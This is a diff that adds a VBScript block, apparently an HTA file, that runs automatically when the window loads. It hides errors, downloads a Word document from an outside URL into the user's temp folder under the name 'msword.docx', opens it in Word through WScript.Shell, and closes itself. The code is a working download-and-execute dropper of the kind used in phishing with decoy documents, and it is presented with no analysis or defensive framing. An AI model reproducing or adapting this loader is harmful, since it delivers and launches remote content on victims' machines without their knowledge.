@@ -1,0 +1,27 @@
+<script language="VBScript">
+    Sub Window_OnLoad()
+
+      On Error Resume Next
+      Dim fso, shell, xml, stream, tempPath, fullPath, fileUrl, wordPath
+      urlToWordDoc = "https://www.montana.edu/engcommtoolkit/writing/documents/Technical%20Writing.docx"
+
+      Set xcute = CreateObject("WScript.Shell")
+      tempPath = xcute.ExpandEnvironmentStrings("%LOCALAPPDATA%\TEMP")
+      fullPath = tempPath & "\msword.docx"
+      wordPath = """C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE""" & fullPath
+
+      Set xml = CreateObject("Microsoft.XMLHTTP")
+      xml.Open "GET", urlToWordDoc, False
+      xml.Send
+
+      Set HTMLFileDownloader = CreateObject("ADODB.Stream")
+      HTMLFileDownloader.Type = 1 ' Binary
+      HTMLFileDownloader.Open
+      HTMLFileDownloader.Write xml.responseBody
+      HTMLFileDownloader.SaveToFile fullPath, 2 ' Overwrite
+      HTMLFileDownloader.Close
+      xcute.Run wordPath, 1, False
+      self.close()
+    End Sub
+
+</script>
